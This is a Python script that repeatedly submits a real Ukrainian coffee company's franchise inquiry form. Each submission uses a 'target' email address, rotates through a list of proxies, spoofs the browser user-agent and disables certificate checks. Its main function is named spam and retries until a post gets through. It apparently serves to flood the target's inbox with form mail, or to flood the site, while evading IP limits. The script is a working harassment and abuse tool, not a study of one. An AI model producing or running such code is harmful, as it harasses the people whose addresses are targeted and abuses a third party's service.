from time import sleep
from typing import Optional

import requests
from faker import Faker
from requests.exceptions import ProxyError
from requests.models import Response

from module.data import generate_proxy, text_body, get_proxies_from_json, main

# all_proxies = get_proxies('west_proxy.txt')
proxy_generator = generate_proxy(get_proxies_from_json(r'../proxies_folder/working_proxies.json'))


def post(email: str, proxy: Optional[str] = None) -> Response:
    headers = {
        'user-agent': Faker().chrome(),
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.6',
        'accept-encoding': 'utf-8',
        'x-localization': 'uk',
        'sec-ch-ua': '"Google Chrome";v="101", "Chromium";v="101", ";Not A Brand";v="99"',
        'sec-ch-mobile': '?0',
        'sec-ch-ua-platform': "Windows",
        'connection': 'keep-alive',
        'referer': 'https://aromakava.ua/',
    }

    body = {
        'prizvishche': text_body,
        'imya': text_body,
        'kontaktniy-telefon': text_body,
        'e-mail': email,
        'misto-dlya-vidkrittya-kavyarni': text_body,
        'bazhaniy-format': text_body,
        'vashe-povidomlennya': text_body
    }
    resp = requests.post('https://aromakava.ua/api/form/2', headers=headers, data=body,
                         proxies={'http': proxy, 'https': proxy},
                         verify=False, timeout=5)
    return resp


def try_to_post(proxy, result: None, target):
    try:
        result = post(email=target, proxy=proxy)
    except ProxyError:
        sleep(20)
    except Exception:
        pass
    finally:
        return result


def spam(target):
    result = None
    if not target:
        return result, target
    while result is None:
        proxy = next(proxy_generator)
        result = try_to_post(proxy, result, target)
    return result, target


if __name__ == '__main__':
    main(spam)
